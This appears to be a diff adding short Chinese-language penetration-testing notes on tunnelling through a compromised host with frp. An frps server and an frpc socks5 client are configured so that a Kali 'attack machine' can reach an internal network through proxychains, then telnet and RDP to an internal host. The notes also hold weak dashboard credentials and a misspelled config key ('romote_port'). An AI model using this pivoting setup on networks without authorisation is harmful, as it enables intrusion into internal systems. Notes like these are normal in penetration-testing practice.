@@ -1,0 +1,48 @@
+frps.ini 服务器端配置:
+[common]
+#frpc客户端 连接到 服务器端口
+bind_addr = 192.168.1.44
+bind_port = 7000
+
+#Web管理网页登录
+dashboard_user = momoda
+dashboard_pwd = momoda
+dashboard_port = 7001
+
+
+frpc.ini 客户端配置:
+[common]
+#frps服务器端 地址端口
+server_addr = 192.168.1.44
+server_port = 7000
+
+[socks5]
+type = tcp
+#kali攻击机 proxychains.conf 里面配置  192.168.1.44 7777
+romote_port = 7777  
+plugin = socks5
+
+
+kali攻击机 proxychains.conf:
+socks5 192.168.1.44 7777
+
+
+
+#######################################################################3
+kali攻击机 连接内网机器 示例:
+proxychains telnet 10.30.30.131
+#输入用户名密码  成功连接内网
+
+proxychain rdesktop 10.30.30.131
+#RDP连接 内网远程桌面
+
+
+
+
+
+
+
+
+
+
+
